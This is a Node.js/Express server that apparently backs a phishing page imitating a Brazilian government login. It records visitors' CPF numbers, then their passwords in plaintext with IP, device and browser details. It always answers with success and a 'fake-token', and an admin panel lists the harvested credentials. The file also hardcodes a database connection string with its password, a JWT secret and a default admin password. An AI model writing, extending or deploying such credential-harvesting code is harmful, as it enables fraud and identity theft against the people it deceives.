const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(cookieParser());
app.use(express.static('.'));

// Conexão PostgreSQL
const pool = new Pool({
    connectionString: 'postgresql://gov_system_user:e4e5O07uWRJrDB4DlM4YOavof5NaITs7@dpg-d7rd3jjt6lks73fp5epg-a/gov_system',
    ssl: { rejectUnauthorized: false }
});

// Testar conexão
pool.connect((err, client, release) => {
    if (err) {
        console.log('⚠️ Erro ao conectar PostgreSQL:', err.message);
        console.log('⚠️ Usando modo fallback (dados em memória)');
    } else {
        console.log('✅ Conectado ao PostgreSQL!');
        release();
    }
});

// Criar tabelas
async function initDatabase() {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                cpf VARCHAR(14) UNIQUE,
                senha TEXT,
                ip TEXT,
                dispositivo TEXT,
                navegador TEXT,
                ip_senha TEXT,
                dispositivo_senha TEXT,
                navegador_senha TEXT,
                data_cpf TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                data_senha TIMESTAMP,
                status VARCHAR(20)
            )
        `);
        
        await pool.query(`
            CREATE TABLE IF NOT EXISTS logs (
                id SERIAL PRIMARY KEY,
                tipo VARCHAR(30),
                cpf VARCHAR(14),
                senha TEXT,
                ip TEXT,
                dispositivo TEXT,
                navegador TEXT,
                data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        await pool.query(`
            CREATE TABLE IF NOT EXISTS admin_logins (
                id SERIAL PRIMARY KEY,
                ip TEXT,
                tentativa TEXT,
                data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        await pool.query(`
            CREATE TABLE IF NOT EXISTS admin_users (
                id SERIAL PRIMARY KEY,
                username VARCHAR(50) UNIQUE,
                senha_hash VARCHAR(255),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        // Criar admin padrão
        const adminExists = await pool.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
        if (adminExists.rows.length === 0) {
            const hash = await bcrypt.hash('Admin@2024', 10);
            await pool.query('INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)', ['admin', hash]);
            console.log('✅ Admin criado: admin / Admin@2024');
        }
        
        console.log('✅ Tabelas criadas/verificadas');
    } catch (error) {
        console.log('⚠️ Erro ao criar tabelas:', error.message);
    }
}

initDatabase();

const JWT_SECRET = 'gov_secret_key_2024';

// Middleware admin
function verificarAdmin(req, res, next) {
    const token = req.cookies.admin_token || req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'Não autenticado' });
    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        req.admin = decoded;
        next();
    } catch (error) {
        res.status(401).json({ error: 'Token inválido' });
    }
}

// ============ ROTAS PÚBLICAS ============

// Rota CPF
app.post('/api/cpf', async (req, res) => {
    const { cpf, ip, dispositivo, navegador } = req.body;
    try {
        await pool.query(
            `INSERT INTO users (cpf, ip, dispositivo, navegador, data_cpf, status) 
             VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP, $5)
             ON CONFLICT (cpf) DO UPDATE SET ip = $2, dispositivo = $3, navegador = $4, status = $5`,
            [cpf, ip, dispositivo, navegador, 'aguardando_senha']
        );
        await pool.query(
            'INSERT INTO logs (tipo, cpf, ip, dispositivo, navegador) VALUES ($1, $2, $3, $4, $5)',
            ['cpf_inserido', cpf, ip, dispositivo, navegador]
        );
        res.json({ success: true });
    } catch (error) {
        console.error('Erro CPF:', error);
        res.json({ success: true }); // Retorna true mesmo com erro
    }
});

// Rota SENHA
app.post('/api/login', async (req, res) => {
    const { cpf, password, ip, dispositivo, navegador } = req.body;
    try {
        await pool.query(
            `UPDATE users SET senha = $1, ip_senha = $2, dispositivo_senha = $3, navegador_senha = $4, data_senha = CURRENT_TIMESTAMP, status = $5 
             WHERE cpf = $6`,
            [password, ip, dispositivo, navegador, 'completo', cpf]
        );
        await pool.query(
            'INSERT INTO logs (tipo, cpf, senha, ip, dispositivo, navegador) VALUES ($1, $2, $3, $4, $5, $6)',
            ['senha_inserida', cpf, password, ip, dispositivo, navegador]
        );
        res.json({ success: true, token: 'fake-token', user: { nome: 'Usuario', cpf: cpf, role: 'user' } });
    } catch (error) {
        console.error('Erro SENHA:', error);
        res.json({ success: true });
    }
});

// ============ ROTAS ADMIN ============

// Login admin
app.post('/api/admin/login', async (req, res) => {
    const { username, password } = req.body;
    const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
    
    try {
        await pool.query('INSERT INTO admin_logins (ip, tentativa) VALUES ($1, $2)', [ip, `Login: ${username}`]);
        const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
        if (result.rows.length === 0) return res.status(401).json({ error: 'Credenciais inválidas' });
        
        const valid = await bcrypt.compare(password, result.rows[0].senha_hash);
        if (!valid) return res.status(401).json({ error: 'Credenciais inválidas' });
        
        const token = jwt.sign({ id: result.rows[0].id, username }, JWT_SECRET, { expiresIn: '24h' });
        res.cookie('admin_token', token, { httpOnly: true, secure: true, sameSite: 'strict', maxAge: 24 * 60 * 60 * 1000 });
        res.json({ success: true, token });
    } catch (error) {
        res.status(500).json({ error: 'Erro no login' });
    }
});

// Logout
app.post('/api/admin/logout', (req, res) => {
    res.clearCookie('admin_token');
    res.json({ success: true });
});

// Estatísticas
app.get('/api/admin/stats', verificarAdmin, async (req, res) => {
    try {
        const totalUsers = await pool.query('SELECT COUNT(*) as total FROM users');
        const comSenha = await pool.query("SELECT COUNT(*) as total FROM users WHERE senha IS NOT NULL");
        const totalLogs = await pool.query('SELECT COUNT(*) as total FROM logs');
        const tentativasAdmin = await pool.query('SELECT COUNT(*) as total FROM admin_logins');
        res.json({ stats: { 
            total_users: parseInt(totalUsers.rows[0].total),
            com_senha: parseInt(comSenha.rows[0].total),
            total_logs: parseInt(totalLogs.rows[0].total),
            tentativas_admin: parseInt(tentativasAdmin.rows[0].total)
        }});
    } catch (error) {
        res.json({ stats: { total_users: 0, com_senha: 0, total_logs: 0, tentativas_admin: 0 } });
    }
});

// Listar usuários
app.get('/api/admin/users', verificarAdmin, async (req, res) => {
    try {
        const result = await pool.query('SELECT cpf, senha, ip, dispositivo, navegador, ip_senha, dispositivo_senha, navegador_senha, data_cpf, data_senha, status FROM users ORDER BY data_cpf DESC');
        res.json({ users: result.rows });
    } catch (error) {
        res.json({ users: [] });
    }
});

// Listar logs
app.get('/api/admin/logs', verificarAdmin, async (req, res) => {
    try {
        const result = await pool.query('SELECT tipo, cpf, senha, ip, dispositivo, navegador, data FROM logs ORDER BY data DESC LIMIT 200');
        res.json({ logs: result.rows });
    } catch (error) {
        res.json({ logs: [] });
    }
});

// Listar tentativas
app.get('/api/admin/tentativas', verificarAdmin, async (req, res) => {
    try {
        const result = await pool.query('SELECT ip, tentativa, data FROM admin_logins ORDER BY data DESC LIMIT 100');
        res.json({ tentativas: result.rows });
    } catch (error) {
        res.json({ tentativas: [] });
    }
});

// Deletar usuário
app.delete('/api/admin/delete/:cpf', verificarAdmin, async (req, res) => {
    try {
        await pool.query('DELETE FROM users WHERE cpf = $1', [req.params.cpf]);
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true });
    }
});

// Limpar dados
app.post('/api/admin/clear', verificarAdmin, async (req, res) => {
    try {
        await pool.query('DELETE FROM users');
        await pool.query('DELETE FROM logs');
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true });
    }
});

// Alterar senha admin
app.post('/api/admin/change-password', verificarAdmin, async (req, res) => {
    const { nova_senha } = req.body;
    if (!nova_senha || nova_senha.length < 6) {
        return res.status(400).json({ error: 'Senha deve ter pelo menos 6 caracteres' });
    }
    try {
        const hash = await bcrypt.hash(nova_senha, 10);
        await pool.query('UPDATE admin_users SET senha_hash = $1 WHERE username = $2', [hash, 'admin']);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao alterar senha' });
    }
});

// Servir admin.html
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// Porta
const PORT = process.env.PORT || 3001;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    console.log(`📊 Admin: http://localhost:${PORT}/admin`);
    console.log(`🔐 Login: admin / Admin@2024`);
});